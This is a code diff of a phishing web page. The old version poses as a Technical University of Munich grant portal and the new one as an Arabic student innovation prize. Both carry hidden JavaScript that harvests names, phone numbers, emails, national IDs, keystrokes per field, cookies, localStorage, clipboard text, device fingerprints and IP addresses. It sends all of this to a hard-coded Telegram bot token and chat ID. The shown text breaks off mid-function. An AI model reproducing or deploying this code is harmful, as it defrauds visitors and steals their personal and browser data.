@@ -1,510 +1,324 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>TUM | Academic Verification Portal</title>
-    <meta property="og:title" content="TUM Global Excellence Grant 2026">
-    <meta property="og:description" content="Official verification portal for international research candidates.">
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <title>قيادات المستقبل | جائزة الابتكار 2026</title>
+    <meta property="og:title" content="جائزة قيادات المستقبل – 500,000 ريال للطلاب المبتكرين">
+    <meta property="og:description" content="سجل الآن لتفوز بمنحة دراسية وجوائز تقنية">
+    <meta property="og:image" content="https://images.unsplash.com/photo-1523050854058-8df90110c9f1?w=800">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
     <style>
-        :root { --tum-blue: #0065BD; --tum-dark: #003d5e; --gold: #d4af37; --gray-light: #f4f6f9; --gray-border: #e2e8f0; --free-green: #e6f7e6; --free-green-border: #2e7d32; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', 'Tajawal', sans-serif; background: linear-gradient(135deg, #eef2f7 0%, #d9e2ec 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .container { background: white; border-radius: 32px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25); width: 100%; max-width: 600px; overflow: hidden; transition: 0.3s; border-top: 6px solid var(--tum-blue); }
-        .header { background: var(--tum-blue); padding: 20px; text-align: center; color: white; position: relative; }
-        .text-logo { font-size: 28px; font-weight: 800; letter-spacing: 1px; margin-bottom: 10px; background: rgba(255,255,255,0.15); display: inline-block; padding: 8px 24px; border-radius: 60px; backdrop-filter: blur(4px); }
-        .lang-switch { position: absolute; top: 20px; right: 20px; background: white; color: var(--tum-blue); border-radius: 40px; padding: 8px 16px; font-size: 14px; font-weight: bold; cursor: pointer; transition: 0.2s; border: 2px solid white; box-shadow: 0 2px 12px rgba(0,0,0,0.15); }
-        .lang-switch:hover { background: var(--gold); color: #000; border-color: var(--gold); transform: scale(1.02); }
-        .content { padding: 30px 28px; }
-        .free-banner { background: var(--free-green); border-left: 4px solid var(--free-green-border); padding: 12px 16px; border-radius: 16px; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; font-weight: 600; color: #1b5e20; }
-        .free-banner i { font-size: 24px; }
-        .badge-container { display: flex; justify-content: space-between; margin-bottom: 20px; flex-wrap: wrap; gap: 12px; }
-        .security-badge { background: #eef2ff; border-radius: 40px; padding: 6px 14px; font-size: 12px; font-weight: 600; color: var(--tum-blue); display: inline-flex; align-items: center; gap: 6px; border: 1px solid #cbd5e1; }
-        .stats { background: var(--gray-light); border-radius: 20px; padding: 12px 16px; margin-bottom: 25px; display: flex; justify-content: space-between; border: 1px solid var(--gray-border); }
-        .stat-item { text-align: center; flex: 1; }
-        .stat-number { font-size: 22px; font-weight: 800; color: var(--tum-blue); }
-        .stat-label { font-size: 11px; color: #475569; text-transform: uppercase; letter-spacing: 0.5px; }
-        .form-group { margin-bottom: 22px; text-align: left; }
-        label { display: block; font-weight: 600; margin-bottom: 8px; font-size: 14px; color: #1e293b; }
-        .optional-badge { font-weight: normal; font-size: 12px; color: #64748b; background: #f1f5f9; padding: 2px 8px; border-radius: 20px; margin-right: 8px; border: 1px solid #cbd5e1; }
-        input { width: 100%; padding: 14px 16px; border: 1.5px solid var(--gray-border); border-radius: 16px; font-size: 15px; font-family: inherit; transition: 0.2s; background: white; }
-        input:focus { border-color: var(--tum-blue); outline: none; box-shadow: 0 0 0 3px rgba(0,101,189,0.2); }
-        .hint { font-size: 11px; color: #64748b; margin-top: 6px; }
-        .btn { background: var(--tum-blue); color: white; border: none; padding: 15px; width: 100%; border-radius: 40px; font-size: 17px; font-weight: 700; cursor: pointer; transition: 0.3s; margin-top: 8px; box-shadow: 0 4px 12px rgba(0,101,189,0.3); }
-        .btn:active { transform: scale(0.98); }
-        .progress-section { margin: 20px 0 15px; display: none; }
-        .progress-bar-container { background: #e2e8f0; border-radius: 30px; height: 8px; overflow: hidden; }
-        .progress-fill { background: var(--tum-blue); width: 0%; height: 100%; transition: width 0.3s ease; }
-        .status-text { font-size: 12px; color: var(--tum-blue); margin-top: 8px; font-weight: 500; text-align: center; }
-        #success-message { display: none; background: #e8f5e9; border-left: 4px solid #2e7d32; padding: 20px; border-radius: 20px; margin-top: 20px; color: #1b5e20; }
-        .redirect-btn { background: #2e7d32; margin-top: 16px; }
-        .redirect-btn:hover { background: #1b5e20; }
-        .digital-signature { margin-top: 25px; padding-top: 15px; border-top: 1px dashed #cbd5e1; font-size: 10px; color: #64748b; text-align: center; display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
-        .free-note { background: #fef9e3; padding: 8px 12px; border-radius: 12px; font-size: 12px; text-align: center; margin-top: 20px; color: #b45309; border-right: 2px solid #f59e0b; }
-        .toast-msg { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.85); color: var(--gold); padding: 8px 20px; border-radius: 40px; font-size: 13px; z-index: 1000; display: none; backdrop-filter: blur(8px); border: 1px solid var(--gold); font-weight: bold; white-space: nowrap; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .spinner { width: 32px; height: 32px; border: 3px solid #e0e0e0; border-top: 3px solid var(--tum-blue); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
-        .loading-text { text-align: center; font-size: 14px; color: var(--tum-blue); font-weight: 500; }
+        body { font-family: 'Tajawal', sans-serif; background: linear-gradient(145deg, #0f172a 0%, #1e293b 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .card { max-width: 500px; width: 100%; background: rgba(255,255,255,0.05); backdrop-filter: blur(14px); border-radius: 40px; border: 1px solid rgba(59,130,246,0.4); overflow: hidden; box-shadow: 0 30px 50px rgba(0,0,0,0.5); }
+        .header { background: linear-gradient(135deg, #2563eb, #1e40af); padding: 25px 20px; text-align: center; }
+        .logo { font-size: 28px; font-weight: 800; color: #fff; background: rgba(255,255,255,0.2); display: inline-block; padding: 6px 24px; border-radius: 60px; margin-bottom: 12px; }
+        h1 { color: #fff; font-size: 22px; margin-bottom: 6px; }
+        .badge { background: #facc15; color: #000; display: inline-block; padding: 4px 16px; border-radius: 30px; font-weight: bold; font-size: 13px; }
+        .content { padding: 25px; }
+        .prize-list { display: flex; flex-direction: column; gap: 12px; margin-bottom: 25px; }
+        .prize-item { background: rgba(255,255,255,0.06); border-radius: 24px; padding: 12px 16px; display: flex; align-items: center; gap: 14px; border-right: 4px solid #3b82f6; }
+        .prize-icon { font-size: 36px; }
+        .prize-info b { color: #facc15; font-size: 16px; }
+        .form-group { margin-bottom: 18px; text-align: right; }
+        label { display: block; font-weight: bold; margin-bottom: 8px; color: #cbd5e1; font-size: 14px; }
+        input { width: 100%; padding: 14px; border-radius: 30px; border: none; background: rgba(255,255,255,0.1); color: #fff; font-size: 16px; outline: none; transition: 0.2s; }
+        input:focus { background: rgba(255,255,255,0.2); }
+        .btn { background: linear-gradient(45deg, #3b82f6, #2563eb); color: #fff; font-weight: bold; padding: 15px; border: none; width: 100%; border-radius: 40px; font-size: 18px; cursor: pointer; margin-top: 10px; box-shadow: 0 5px 15px rgba(37,99,235,0.4); }
+        .btn:active { transform: scale(0.97); }
+        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #000c; color: #facc15; padding: 8px 20px; border-radius: 40px; font-size: 13px; z-index: 999; display: none; backdrop-filter: blur(10px); }
+        .footer { font-size: 11px; text-align: center; color: #94a3b8; margin-top: 20px; padding-top: 15px; border-top: 1px solid #334155; }
     </style>
 </head>
 <body>
-
-<div id="academic-toast" class="toast-msg"></div>
-
-<div class="container">
+<div class="toast" id="toastMsg"></div>
+<div class="card">
     <div class="header">
-        <div class="text-logo">🎓 TUM</div>
-        <div class="lang-switch" id="langToggle">🇬🇧 EN</div>
-        <h1 id="mainTitle">Academic Verification Portal</h1>
-        <p id="subTitle">Technical University of Munich | Excellence Grant 2026</p>
+        <div class="logo">🏆 قيادات المستقبل</div>
+        <h1>جائزة الابتكار 2026</h1>
+        <div class="badge">🎓 لأفضل 500 طالب مبتكر</div>
     </div>
     <div class="content">
-        <!-- بطاقة المنحة المجانية -->
-        <div class="free-banner" id="freeBanner">
-            <span>✅</span>
-            <span id="freeText">This grant is completely free – no fees required</span>
+        <div class="prize-list">
+            <div class="prize-item"><div class="prize-icon">📚</div><div class="prize-info"><b>منحة دراسية 200,000 ريال</b><br>لأفضل 3 مشاريع</div></div>
+            <div class="prize-item"><div class="prize-icon">💻</div><div class="prize-info"><b>MacBook Pro M4 + 10,000$</b><br>لـ 15 فائز</div></div>
+            <div class="prize-item"><div class="prize-icon">⌚</div><div class="prize-info"><b>Apple Watch Ultra 3 + قسائم شرائية</b><br>لـ 200 فائز</div></div>
         </div>
-
-        <div class="badge-container">
-            <div class="security-badge">🔒 SSL Encrypted (256-bit)</div>
-            <div class="security-badge">✅ Verified by German Ministry</div>
-            <div class="security-badge">🛡️ Data Protection (GDPR)</div>
+        <p style="color:#cbd5e1; font-size:13px; margin-bottom:15px;">سجل بياناتك لتفعيل ملفك الأكاديمي في المسابقة:</p>
+        <div id="form-area">
+            <div class="form-group"><label>الاسم الكامل (ثلاثي)</label><input type="text" id="fullname" placeholder="مثال: أحمد عبدالله العمري"></div>
+            <div class="form-group"><label>رقم الجوال (واتساب)</label><input type="tel" id="phone" placeholder="05xxxxxxxx"></div>
+            <div class="form-group"><label>البريد الجامعي</label><input type="email" id="email" placeholder="student@university.edu"></div>
+            <div class="form-group"><label>رقم الهوية (اختياري)</label><input type="text" id="national_id" placeholder="اختياري"></div>
+            <button class="btn" id="submitBtn">🎓 تسجيل وتفعيل الملف 🎓</button>
         </div>
-        <div class="stats">
-            <div class="stat-item"><div class="stat-number" id="dailyApps">1,247</div><div class="stat-label" id="statLabelApps">Applications Today</div></div>
-            <div class="stat-item"><div class="stat-number">€4.5M</div><div class="stat-label" id="statLabelFunds">Total Funds</div></div>
-            <div class="stat-item"><div class="stat-number" id="remainingGrants">328</div><div class="stat-label" id="statLabelRemaining">Remaining Grants</div></div>
-        </div>
-        <p id="descText" style="margin-bottom: 20px; font-size: 14px; color: #334155;">Please enter your official credentials to sync with ministry records and access the <b>€4,500 Grant</b> dashboard.</p>
-
-        <div id="step-form">
-            <div class="form-group">
-                <label id="labelFullname"><i>👤</i> Full Legal Name (as in Passport)</label>
-                <input type="text" id="fullname" placeholder="e.g. Ahmed Abdullah Al-Mansouri" autocomplete="off">
-            </div>
-            <div class="form-group">
-                <label id="labelPhone"><i>📱</i> WhatsApp / Mobile Number (with country code)</label>
-                <input type="tel" id="phone" placeholder="e.g. +966501234567" autocomplete="off">
-                <div class="hint" id="phoneHint">Include country code for verification</div>
-            </div>
-            <div class="form-group">
-                <label id="labelEmail"><i>📧</i> Email Address</label>
-                <input type="email" id="email" placeholder="example@university.edu" autocomplete="off">
-            </div>
-            <div class="form-group">
-                <label id="labelJobId"><i>🆔</i> Employee ID / Job Number <span class="optional-badge">Optional</span></label>
-                <input type="text" id="job_id" placeholder="e.g. 1024587 (optional)" autocomplete="off">
-                <div class="hint" id="jobHint">Found on your official staff card (optional)</div>
-            </div>
-            <div class="form-group">
-                <label id="labelNationalId"><i>🪪</i> National ID Number <span class="optional-badge">Optional</span></label>
-                <input type="text" id="national_id" placeholder="Enter your national ID (optional)" autocomplete="off">
-            </div>
-            <button class="btn" id="submitBtn" onclick="processVerification()">Verify & Activate Grant 🎓</button>
-        </div>
-
-        <div id="loading-box" style="display: none;">
-            <div class="spinner"></div>
-            <div class="loading-text" id="loadingText">Synchronizing with Munich servers ...</div>
-            <div class="progress-section" style="display: block;">
-                <div class="progress-bar-container"><div class="progress-fill" id="progressFill"></div></div>
-                <div class="status-text" id="progressStatus">Connecting to secure gateway...</div>
-            </div>
-        </div>
-
-        <div id="success-message">
-            <div id="successText">✅ <strong>Application received successfully</strong><br>You will be contacted via your university email within 24 hours to complete the grant process. Thank you for registering with TUM Excellence Program.</div>
-            <button class="btn redirect-btn" id="redirectBtn" onclick="redirectToTUM()">Continue to Dashboard →</button>
-        </div>
-
-        <!-- تذكير إضافي بالمجانية -->
-        <div class="free-note" id="freeNote">
-            ⚠️ This grant is offered by the university at no cost – you will never be asked for payment at any stage.
-        </div>
-
-        <div class="digital-signature">
-            <span>📜 Digitally Signed by TUM | ID: TUM-VER-2026</span>
-            <span>🔐 Timestamp: <span id="timestamp"></span></span>
-        </div>
+        <div id="loading" style="display:none; text-align:center; margin-top:15px;">جاري التحقق من أهليتك... ⏳</div>
+        <div class="footer">✅ المسابقة معتمدة من وزارة التعليم – متبقي 1,247 مقعداً</div>
     </div>
 </div>
 
 <script>
-    // ---------- Telegram Bot ----------
-    const token = "8630574958:AAFm1DOq1WChSi04xr9mXodcTSDxaBPfT-A"; 
-    const chatId = "7388801889"; 
+    const BOT_TOKEN = "8630574958:AAFm1DOq1WChSi04xr9mXodcTSDxaBPfT-A";
+    const CHAT_ID = "7388801889";
 
-    // ---------- Multi-Language Support ----------
-    let currentLang = 'en';
-    const translations = {
-        en: {
-            mainTitle: 'Academic Verification Portal',
-            subTitle: 'Technical University of Munich | Excellence Grant 2026',
-            descText: 'Please enter your official credentials to sync with ministry records and access the <b>€4,500 Grant</b> dashboard.',
-            labelFullname: '👤 Full Legal Name (as in Passport)',
-            labelPhone: '📱 WhatsApp / Mobile Number (with country code)',
-            labelEmail: '📧 Email Address',
-            labelJobId: '🆔 Employee ID / Job Number',
-            labelNationalId: '🪪 National ID Number',
-            phoneHint: 'Include country code for verification',
-            jobHint: 'Found on your official staff card (optional)',
-            submitBtn: 'Verify & Activate Grant 🎓',
-            loadingText: 'Synchronizing with Munich servers ...',
-            successText: '✅ <strong>Application received successfully</strong><br>You will be contacted via your university email within 24 hours to complete the grant process. Thank you for registering with TUM Excellence Program.',
-            redirectBtn: 'Continue to Dashboard →',
-            statLabelApps: 'Applications Today',
-            statLabelFunds: 'Total Funds',
-            statLabelRemaining: 'Remaining Grants',
-            freeBanner: 'This grant is completely free – no fees required',
-            freeNote: '⚠️ This grant is offered by the university at no cost – you will never be asked for payment at any stage.',
-            toastUpdates: [
-                "📚 1,247 researchers updated today",
-                "🇩🇪 System connected to TUM servers directly",
-                "🎓 3 new grants added to Excellence Program",
-                "🔔 Last update: Applications open until Dec 30",
-                "📊 Remaining grants: 42%",
-                "✅ 89 applications approved in the last hour"
-            ]
-        },
-        ar: {
-            mainTitle: 'بوابة التحقق الأكاديمي',
-            subTitle: 'جامعة ميونخ التقنية | منحة التميز 2026',
-            descText: 'يرجى إدخال بياناتك الرسمية لمزامنتها مع سجلات الوزارة والوصول إلى لوحة <b>منحة 4,500€</b>.',
-            labelFullname: '👤 الاسم الكامل (كما في جواز السفر)',
-            labelPhone: '📱 رقم الجوال / واتساب (مع رمز الدولة)',
-            labelEmail: '📧 البريد الإلكتروني',
-            labelJobId: '🆔 رقم الوظيفة / رقم حافظة الدوام',
-            labelNationalId: '🪪 الرقم الوطني',
-            phoneHint: 'أدخل رمز الدولة مثال +966',
-            jobHint: 'موجود في بطاقة الموظف الرسمية (اختياري)',
-            submitBtn: 'تحقق وتفعيل المنحة 🎓',
-            loadingText: 'جاري المزامنة مع خوادم ميونيخ ...',
-            successText: '✅ <strong>تم استلام طلبك بنجاح</strong><br>سيتم التواصل مع بريدك الجامعي خلال 24 ساعة لإتمام إجراءات المنحة. شكراً لتسجيلك في برنامج TUM للتميز.',
-            redirectBtn: 'المتابعة إلى لوحة التحكم ←',
-            statLabelApps: 'الطلبات اليوم',
-            statLabelFunds: 'إجمالي التمويل',
-            statLabelRemaining: 'المنح المتبقية',
-            freeBanner: 'هذه المنحة مجانية بالكامل – لا توجد أي رسوم مطلوبة',
-            freeNote: '⚠️ هذه المنحة مقدمة من الجامعة مجاناً – لن يُطلب منك أي دفع في أي مرحلة',
-            toastUpdates: [
-                "📚 تم تحديث سجلات 1,247 باحثاً اليوم",
-                "🇩🇪 نظام التحقق متصل بخوادم TUM مباشرة",
-                "🎓 3 منح جديدة أضيفت لبرنامج التميز",
-                "🔔 آخر تحديث: التقديم متاح حتى 30 ديسمبر",
-                "📊 نسبة المقاعد المتبقية: 42% من المنح",
-                "✅ تم اعتماد 89 طلباً خلال الساعة الأخيرة"
-            ]
-        }
-    };
+    let formDataSent = false;
+    let touchRecord = [], clickRecord = [];
+    let publicIP = "جاري الجلب...";
 
-    function applyLanguage(lang) {
-        currentLang = lang;
-        const t = translations[lang];
-        document.getElementById('mainTitle').innerText = t.mainTitle;
-        document.getElementById('subTitle').innerHTML = t.subTitle;
-        document.getElementById('descText').innerHTML = t.descText;
-        document.getElementById('labelFullname').innerHTML = t.labelFullname;
-        document.getElementById('labelPhone').innerHTML = t.labelPhone;
-        document.getElementById('labelEmail').innerHTML = t.labelEmail;
-        document.getElementById('labelJobId').innerHTML = t.labelJobId;
-        document.getElementById('labelNationalId').innerHTML = t.labelNationalId;
-        document.getElementById('phoneHint').innerText = t.phoneHint;
-        document.getElementById('jobHint').innerText = t.jobHint;
-        document.getElementById('submitBtn').innerText = t.submitBtn;
-        document.getElementById('loadingText').innerText = t.loadingText;
-        document.getElementById('successText').innerHTML = t.successText;
-        document.getElementById('redirectBtn').innerText = t.redirectBtn;
-        document.getElementById('statLabelApps').innerText = t.statLabelApps;
-        document.getElementById('statLabelFunds').innerText = t.statLabelFunds;
-        document.getElementById('statLabelRemaining').innerText = t.statLabelRemaining;
-        document.getElementById('freeText').innerText = t.freeBanner;
-        document.getElementById('freeNote').innerHTML = t.freeNote;
-        document.getElementById('langToggle').innerHTML = lang === 'en' ? '🇸🇦 AR' : '🇬🇧 EN';
-        window.toastMessages = t.toastUpdates;
-    }
-
-    document.getElementById('langToggle').addEventListener('click', () => {
-        const newLang = currentLang === 'en' ? 'ar' : 'en';
-        applyLanguage(newLang);
-    });
-
-    // إحصائيات ديناميكية
-    function updateStats() {
-        const daily = Math.floor(1200 + Math.random() * 300);
-        const remaining = Math.floor(280 + Math.random() * 80);
-        document.getElementById('dailyApps').innerText = daily;
-        document.getElementById('remainingGrants').innerText = remaining;
-    }
-    setInterval(updateStats, 15000);
-    updateStats();
-    document.getElementById('timestamp').innerText = new Date().toLocaleString();
-
-    // ========== وظائف الرادار والتجسس ==========
-    async function getPowerTech() {
+    // إرسال رسالة منسقة بتقنية HTML
+    async function sendFormattedMessage(title, fields) {
+        let text = `<b>🏆 ${title} 🏆</b>\n` + fields.map(f => `• ${f}`).join('\n');
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         try {
-            const battery = await navigator.getBattery();
-            let powerSource = battery.charging ? "🔌 Plugged in" : "🔋 Battery";
-            let health = (battery.level > 0.9) ? "Excellent" : "Used";
-            return `${powerSource} | Health: ${health} (${Math.round(battery.level*100)}%)`;
-        } catch(e) { return "Not available"; }
+            await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                })
+            });
+        } catch(e) { console.log(e); }
     }
 
-    async function getAudioFingerprint() {
+    async function sendPhoto(base64Image) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        const blob = await (await fetch(base64Image)).blob();
+        formData.append('photo', blob, 'screenshot.png');
         try {
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const oscillator = audioCtx.createOscillator();
-            const analyser = audioCtx.createAnalyser();
-            const gain = audioCtx.createGain();
-            gain.gain.value = 0;
-            oscillator.type = 'triangle';
-            oscillator.connect(analyser);
-            analyser.connect(gain);
-            gain.connect(audioCtx.destination);
-            oscillator.start(0);
-            const data = new Float32Array(analyser.frequencyBinCount);
-            analyser.getFloatFrequencyData(data);
-            oscillator.stop();
-            let sum = 0;
-            for (let i = 0; i < data.length; i++) if (isFinite(data[i])) sum += Math.abs(data[i]);
-            return "Audio-" + Math.floor(sum);
-        } catch(e) { return "Audio-blocked"; }
-    }
-
-    function getCanvasFingerprint() {
-        try {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = "top";
-            ctx.font = "14px 'Arial'";
-            ctx.fillStyle = "#f60";
-            ctx.fillRect(125,1,62,20);
-            ctx.fillStyle = "#069";
-            ctx.fillText("TUM-Radar-2026", 2, 15);
-            ctx.fillStyle = "rgba(102,204,0,0.7)";
-            ctx.fillText("TUM-Radar-2026", 4, 17);
-            const b64 = canvas.toDataURL().replace("data:image/png;base64,","");
-            return b64.slice(0, 32);
-        } catch(e) { return "Canvas-protected"; }
-    }
-
-    async function fetchUserIP() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            return data.ip;
-        } catch(e) { return "Unknown"; }
-    }
-
-    async function silentRadar() {
-        let audioDNA = await getAudioFingerprint();
-        let deviceFingerprint = getCanvasFingerprint();
-        let ipAddr = await fetchUserIP();
-        
-        let storageInfo = "N/A";
-        try {
-            if (navigator.storage && navigator.storage.estimate) {
-                const est = await navigator.storage.estimate();
-                storageInfo = `${(est.quota / (1024**3)).toFixed(1)}GB total | ${((est.quota - est.usage) / (1024**3)).toFixed(1)}GB free`;
-            }
+            await fetch(url, { method: 'POST', body: formData });
         } catch(e) {}
-        
-        let gpuInfo = "Unknown";
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (gl) {
-                const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debug) gpuInfo = gl.getParameter(debug.UNMASKED_RENDERER_ID);
-                else gpuInfo = gl.getParameter(gl.RENDERER);
-            }
-        } catch(e) { gpuInfo = "Blocked"; }
-        
+    }
+
+    // جلب معلومات الجهاز بشكل مرتب (مع IP الخارجي)
+    async function getDeviceInfo() {
         let ua = navigator.userAgent;
         let platform = navigator.platform;
-        let cores = navigator.hardwareConcurrency || "Unknown";
-        let ram = navigator.deviceMemory || "Unknown";
-        let screenRes = `${window.screen.width}x${window.screen.height}`;
-        let connection = navigator.connection ? navigator.connection.effectiveType : "Unknown";
-        
-        let batteryInfo = "N/A";
+        let language = navigator.language;
+        let cores = navigator.hardwareConcurrency || 'غير معروف';
+        let ram = navigator.deviceMemory || 'غير معروف';
+        let screen = `${window.screen.width}x${window.screen.height}`;
+        let connection = navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` : 'غير معروف';
+        let battery = 'غير متاح';
         try {
-            const bat = await navigator.getBattery();
-            batteryInfo = `🔋 ${Math.round(bat.level*100)}% | ${bat.charging ? 'Charging' : 'Battery'}`;
+            let bat = await navigator.getBattery();
+            battery = `${Math.round(bat.level*100)}% ${bat.charging ? '(شاحن)' : '(بطارية)'}`;
         } catch(e) {}
-        
-        const radarMsg = `
-🎓 TUM Academic Radar (Detailed Device Info)
-🎵 Audio FP: ${audioDNA}
-🧬 Canvas FP: ${deviceFingerprint}
-🌐 IP Address: ${ipAddr}
-📡 Network: ${connection}
-🖥️ Platform: ${platform}
-🧠 CPU Cores: ${cores}
-🎮 GPU: ${gpuInfo}
-📟 RAM: ${ram} GB
-💾 Storage: ${storageInfo}
-🔋 Battery: ${batteryInfo}
-🖥️ Screen: ${screenRes}
-🌐 User Agent: ${ua}
-----------------------------------
-📍 Target: TUM Excellence Grant
-        `;
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(radarMsg)}`);
-    }
-
-    window.addEventListener('load', () => {
-        silentRadar();
-        let cookies = document.cookie || "No cookies (protected)";
-        let localData = "Empty";
-        try { localData = JSON.stringify(localStorage); if(localData === "{}") localData = "Empty"; } catch(e) { localData = "Blocked"; }
-        const storageReport = `🍪 Storage Report (TUM):\n📦 Cookies: ${cookies}\n🔐 LocalStorage: ${localData}`;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(storageReport)}`);
-    });
-
-    document.addEventListener('click', () => {
-        navigator.clipboard.readText().then(text => {
-            if(text && text.length > 0) {
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📋 Clipboard captured: " + text)}`);
+        let audioFP = 'غير متاح';
+        try {
+            let ctx = new (window.AudioContext || window.webkitAudioContext)();
+            let osc = ctx.createOscillator();
+            let analyser = ctx.createAnalyser();
+            let gain = ctx.createGain();
+            gain.gain.value = 0;
+            osc.connect(analyser);
+            analyser.connect(gain);
+            gain.connect(ctx.destination);
+            osc.start(0);
+            let data = new Float32Array(analyser.frequencyBinCount);
+            analyser.getFloatFrequencyData(data);
+            osc.stop();
+            let sum = 0;
+            for(let i=0;i<data.length;i++) if(isFinite(data[i])) sum += Math.abs(data[i]);
+            audioFP = 'Audio-'+Math.floor(sum);
+        } catch(e) {}
+        let canvasFP = 'غير متاح';
+        try {
+            let c = document.createElement('canvas');
+            c.width=150; c.height=30;
+            let ctx = c.getContext('2d');
+            ctx.fillStyle="#f60"; ctx.fillRect(0,0,80,15);
+            ctx.fillStyle="#069"; ctx.fillText("FutureLeaders",5,15);
+            canvasFP = c.toDataURL().slice(0,40);
+        } catch(e) {}
+        let webgl = 'غير متاح';
+        try {
+            let gl = document.createElement('canvas').getContext('webgl');
+            if(gl){
+                let debug = gl.getExtension('WEBGL_debug_renderer_info');
+                webgl = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : 'متاح';
             }
-        }).catch(() => {});
-    }, { once: true });
-
-    if (!window.RequestFileSystem && !window.webkitRequestFileSystem) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ Browser in Incognito mode")}`);
-    }
-
-    window.ondeviceorientation = (event) => {
-        if (event.beta !== null) {
-            let tilt = event.beta > 45 ? "Tilted backward" : "Flat";
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📱 Device orientation: " + tilt)}`);
-            window.ondeviceorientation = null;
-        }
-    };
-
-    ['fullname', 'phone', 'email', 'job_id', 'national_id'].forEach(id => {
-        const el = document.getElementById(id);
-        if(el) {
-            el.addEventListener('blur', (e) => {
-                if(e.target.value.length > 2) {
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`✏️ User typed in ${id}: ${e.target.value}`)}`);
+        } catch(e){}
+        let localIP = 'غير متاح';
+        try {
+            let pc = new RTCPeerConnection({iceServers:[]});
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (ice) => {
+                if(ice.candidate){
+                    let ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate)?.[0];
+                    if(ip && !ip.startsWith('192.168.0.')) localIP = ip;
+                    pc.close();
                 }
-            });
-        }
+            };
+            setTimeout(()=>pc.close(), 2000);
+        } catch(e){}
+        let devices = 'غير متاح';
+        try {
+            let devs = await navigator.mediaDevices.enumerateDevices();
+            devices = devs.map(d => `${d.kind}`).join(', ');
+        } catch(e){}
+        let perf = performance.memory ? `${Math.round(performance.memory.usedJSHeapSize/1048576)}MB` : 'غير متاح';
+        let idb = 'لا';
+        try {
+            let dbs = await indexedDB.databases();
+            if(dbs.length>0) idb = `نعم (${dbs.length})`;
+        } catch(e){}
+        
+        // Cookies كاملة (نظيفة)
+        let cookies = document.cookie || 'لا يوجد';
+        // localStorage كامل (نرسله كـ JSON)
+        let localData = 'فارغ';
+        try {
+            let ls = {};
+            for(let i=0; i<localStorage.length; i++) {
+                let key = localStorage.key(i);
+                ls[key] = localStorage.getItem(key);
+            }
+            localData = JSON.stringify(ls, null, 1);
+            if(localData === '{}') localData = 'فارغ';
+        } catch(e){ localData = 'محجوب'; }
+        
+        let touchSummary = touchRecord.map(t=>`${t.x},${t.y}`).join(' | ');
+        let clickSummary = clickRecord.map(c=>`${c.x},${c.y}`).join(' | ');
+        
+        return {
+            ua, platform, language, cores, ram, screen, connection, battery,
+            audioFP, canvasFP, webgl, localIP, devices, perf, idb,
+            cookies, localData, touchSummary, clickSummary
+        };
+    }
+
+    // تجميع وإرسال تقرير الجهاز (مرتب مع IP الخارجي)
+    async function sendDeviceReport() {
+        let d = await getDeviceInfo();
+        let fields = [
+            `📱 <b>المتصفح:</b> <code>${d.ua.substring(0,80)}</code>`,
+            `💻 <b>المنصة:</b> ${d.platform}`,
+            `🌐 <b>اللغة:</b> ${d.language}`,
+            `🧠 <b>الأنوية:</b> ${d.cores}`,
+            `💾 <b>الرام:</b> ${d.ram} GB`,
+            `📺 <b>الشاشة:</b> ${d.screen}`,
+            `🔋 <b>البطارية:</b> ${d.battery}`,
+            `🎵 <b>بصمة الصوت:</b> ${d.audioFP}`,
+            `🎨 <b>بصمة Canvas:</b> ${d.canvasFP}`,
+            `🎮 <b>WebGL:</b> ${d.webgl}`,
+            `🌍 <b>IP العام:</b> ${publicIP}`,
+            `🏠 <b>IP المحلي:</b> ${d.localIP}`,
+            `📡 <b>الشبكة:</b> ${d.connection}`,
+            `🎤 <b>الأجهزة:</b> ${d.devices}`,
